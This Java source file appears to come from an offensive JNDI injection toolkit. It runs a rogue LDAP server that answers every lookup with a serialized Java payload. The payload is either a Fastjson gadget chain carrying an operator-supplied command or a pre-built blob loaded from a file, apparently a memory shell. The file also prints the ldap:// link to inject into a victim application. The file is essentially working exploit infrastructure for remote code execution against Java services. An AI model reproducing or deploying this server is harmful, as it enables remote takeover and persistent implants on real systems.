package me.jiu.server;

import cn.hutool.core.io.FileUtil;
import cn.hutool.core.util.RandomUtil;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import me.jiu.Config;
import me.jiu.gadget.FastJson1;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    // hutool 生成随机字符串

    private static final String base =  RandomUtil.randomString(5);

    public static void start() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig("listen", InetAddress.getByName(Config.address), Config.port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory)SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on " + Config.address + ":" + Config.port);
            System.out.println("JNDI Links: ldap://" + Config.address + ":" + Config.port + "/" + base);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor
            extends InMemoryOperationInterceptor {
        private OperationInterceptor() {
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            Entry e = new Entry(base);
            try {
                this.sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            String randomStr = RandomUtil.randomString(5);
            e.addAttribute("javaClassName", randomStr);
            if (Config.command != null) {
                e.addAttribute("javaSerializedData", Base64.decode(FastJson1.gen()));
                System.out.println("Sending data to client...");
            }
            if (Config.mem != null) {
                // 读取指定文件的数据
                String data = FileUtil.readString(Config.mem, "UTF-8");
                e.addAttribute("javaSerializedData", Base64.decode(data));
                System.out.println("Sending data to client...");
            }
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
